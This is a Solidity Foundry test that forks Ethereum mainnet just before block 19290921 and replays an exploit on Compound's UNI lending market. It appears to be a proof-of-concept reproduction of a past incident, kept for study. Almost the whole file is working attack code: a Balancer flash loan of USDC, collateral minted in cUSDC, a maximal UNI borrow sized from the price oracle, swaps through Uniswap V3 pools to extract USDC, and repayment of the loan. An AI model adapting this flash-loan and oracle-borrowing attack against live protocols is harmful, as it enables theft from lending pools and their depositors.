// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

import "@interface/IBalancer.sol";
import "@interface/IERC20.sol";
import "@interface/IWETH9.sol";
import "@interface/ICompound.sol";
import "@interface/IUniswapV3.sol";

IBalancerVault constant vault = IBalancerVault(
    0xBA12222222228d8Ba445958a75a0704d566BF2C8
);
IERC20 constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
ICErc20 constant cUSDC = ICErc20(0x39AA39c021dfbaE8faC545936693aC917d5E7563);
IComptroller constant comptroller = IComptroller(
    payable(0x3d9819210A31b4961b30EF54bE2aeD79B9c9Cd3B)
);
ICErc20Delegator constant cUniToken = ICErc20Delegator(
    payable(0x35A18000230DA775CAc24873d00Ff85BccdeD550)
);

IUniswapV3Pool constant UNI_WETH_Pool = IUniswapV3Pool(
    0x1d42064Fc4Beb5F8aAF85F4617AE8b3b5B8Bd801
);
IUniswapV3Pool constant WETH_USDC_Pool = IUniswapV3Pool(
    0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640
);

IERC20 constant UniToken = IERC20(0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984);
WETH9 constant WETH = WETH9(
    payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2)
);
IUniswapAnchoredView constant UniswapAnchoredView = IUniswapAnchoredView(
    0x50ce56A3239671Ab62f185704Caedf626352741e
);

contract CompoundUniTest is Test {
    uint256 public AMOUNT = 193020254960;

    function setUp() public {
        vm.createSelectFork("mainnet", 19290921 - 1);
        vm.label(address(vault), "Balancer vault");
        vm.label(address(USDC), "USDC");
        vm.label(address(cUSDC), "cUSDC");
        vm.label(address(comptroller), "comptroller");
        vm.label(address(cUniToken), "cUniToken");
        vm.label(address(UNI_WETH_Pool), "UNI_WETH_Pool");
        vm.label(address(UniToken), "UniToken");
        vm.label(address(WETH_USDC_Pool), "WETH_USDC_Pool");
        vm.label(address(WETH), "WETH");
    }

    function print(string memory _txt, uint256 value, uint256 decimal) public {
        emit log_named_decimal_uint(_txt, value, decimal);
    }

    function testExploit() public {
        print("USDC Before attack", USDC.balanceOf(address(this)), 6);

        address[] memory tokens = new address[](1);
        uint256[] memory amounts = new uint256[](1);
        tokens[0] = address(USDC);
        amounts[0] = AMOUNT;
        vault.flashLoan(address(this), tokens, amounts, bytes(""));

        print("USDC After attack", USDC.balanceOf(address(this)), 6);
    }

    function receiveFlashLoan(
        IERC20[] memory,
        uint256[] memory,
        uint256[] memory,
        bytes memory
    ) public {
        // pledge the USDC
        USDC.approve(address(cUSDC), AMOUNT);
        cUSDC.mint(AMOUNT);
        address[] memory cTokens = new address[](1);
        cTokens[0] = address(cUSDC);
        comptroller.enterMarkets(cTokens);

        // You should calculate the max u can borrow
        (, uint myTotalLiquidity, ) = comptroller.getAccountLiquidity(
            address(this)
        );

        // The max amount of UNI we can borrow = AccountLiquidity / UNI's price in compound
        uint256 max_UNI_borrow = (myTotalLiquidity /
            UniswapAnchoredView.getUnderlyingPrice(address(cUniToken))) *
            10 ** UniToken.decimals();
        cUniToken.borrow(max_UNI_borrow);

        // Swap: UNI => WETH => USDC, for the low Slippage
        UNI_WETH_Pool.swap(
            address(this),
            true,
            int(UniToken.balanceOf(address(this))),
            42095128740,
            bytes("")
        );
        WETH_USDC_Pool.swap(
            address(this),
            false,
            int(WETH.balanceOf(address(this))),
            1461446703485210103287273052203988822378723970341,
            bytes("")
        );

        USDC.transfer(msg.sender, AMOUNT); // pay back flashloan
    }

    uint256 public num = 0;

    function uniswapV3SwapCallback(
        int256 amount0Delta,
        int256 amount1Delta,
        bytes calldata
    ) public {
        // For the twice swap()
        if (num == 0) {
            UniToken.transfer(msg.sender, uint256(amount0Delta));
            num++;
        } else {
            WETH.transfer(msg.sender, uint256(amount1Delta));
        }
    }
}
